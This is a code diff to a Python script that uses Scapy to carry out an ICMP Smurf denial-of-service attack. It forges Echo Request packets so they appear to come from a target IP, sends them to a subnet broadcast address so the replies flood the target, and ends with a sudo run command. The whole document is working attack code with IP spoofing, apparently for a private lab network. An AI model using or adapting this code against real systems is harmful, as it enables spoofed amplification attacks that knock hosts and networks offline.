@@ -3,9 +3,11 @@ import random
 import time
 import ipaddress
 
-# Ataque ICMP Flood, sem payload (mínimo), spoofing de IP.
+# ICMP Smurf
+BROADCAST_IP = "192.168.100.255"
 TARGET_IP = "192.168.100.2"
-BOTFILE = "bots.txt"
+BOTFILE = "../bots.txt"
+NUM_PACKETS = 100
 
 def load_bots(filename):
     bot_ips = []
@@ -17,7 +19,7 @@ def load_bots(filename):
                 bot_ips.append(ip)
     return bot_ips
 
-def run_icmp_flood_attack():
+def run_icmp_smurf():
     bot_ips = load_bots(BOTFILE)
     lista_de_pacotes = []
     numero_de_pacotes_enviados = 0
@@ -25,14 +27,14 @@ def run_icmp_flood_attack():
 
     while True:
         dest_ip = random.choice(bot_ips)
-        ip_layer = IP(src=TARGET_IP, dst="192.168.100.255") # O target receberá as replys (ping no Google)
+        ip_layer = IP(src=TARGET_IP, dst=BROADCAST_IP)
         eth_layer = Ether()
-        icmp_layer = ICMP(type=8, code=0)  # Echo Request, sem payload
+        icmp_layer = ICMP(type=8, code=0)  # Echo Request
         packet = eth_layer / ip_layer / icmp_layer
         lista_de_pacotes.append(packet)
         numero_de_pacotes_enviados += 1
 
-        if numero_de_pacotes_enviados == 100:
+        if numero_de_pacotes_enviados == NUM_PACKETS:
             break
 
 
@@ -41,10 +43,10 @@ def run_icmp_flood_attack():
     end_time = time.perf_counter()
     duration = end_time - start_time
 
-    print(f"\nEnvio concluído.")
-    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")
+    print(f"\nSending completed.")
+    print(f"Total time to send packets: {duration:.4f} seconds")
 
 if __name__ == "__main__":
-    run_icmp_flood_attack()
+    run_icmp_smurf()
 
 # sudo PYTHONPATH=$HOME/scapy python3 icmp_smurf.py
